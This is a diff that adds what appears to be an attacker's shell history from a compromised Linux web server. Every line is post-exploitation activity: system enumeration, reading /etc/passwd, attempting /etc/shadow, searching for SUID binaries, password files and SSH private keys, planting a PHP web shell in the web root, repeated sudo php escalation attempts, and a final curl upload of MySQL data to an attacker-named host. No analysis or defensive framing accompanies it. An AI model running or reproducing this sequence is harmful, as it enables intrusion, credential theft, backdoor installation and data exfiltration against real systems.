@@ -1,0 +1,62 @@
+pwd
+ls -la
+cd /
+ls
+cd /var/www/html
+ls
+cat index.php
+cat config.php
+whoami
+id
+groups
+cat /etc/passwd
+cat /etc/group
+ls -la /home
+cd /home
+ls -la
+cd apache
+ls -la
+cat .bash_history
+sudo -l
+sudo cat /etc/shadow
+sudo: no tty present and no askpass program specified
+find / -perm -4000 2>/dev/null
+ls -la /usr/bin
+ls -la /usr/sbin
+echo "<?php system('id'); ?>" > /var/www/html/shell.php
+chmod +x /var/www/html/shell.php
+ls -la /var/www/html/shell.php
+netstat -tuln
+ifconfig
+cat /etc/hosts
+cat /etc/resolv.conf
+cd /var/log
+ls -la
+cat auth.log
+cat apache2/access.log
+cat apache2/error.log
+find / -name "*password*" 2>/dev/null
+find / -name "*key*" 2>/dev/null
+cat /root/.ssh/id_rsa
+cat /home/apache/.ssh/id_rsa
+crontab -l
+cat /etc/crontab
+ls -la /etc/cron.*
+uname -a
+cat /proc/version
+vim .bashrc
+source .bashrc
+sudo php -r "system('$CMD');"
+vim .bashrc
+source .bashrc
+sudo php -r "system('$CMD');"
+vim .bashrc
+source .bashrc
+sudo php -r "system('$CMD');"
+vim .bashrc
+source .bashrc
+sudo php -r "system('$CMD');"
+vim .bashrc
+source .bashrc
+sudo php -r "system('$CMD');"
+curl -F 'files[]=@/var/mysql/data' http://get-hacked.hhaacckkeerr.org/upload-curl
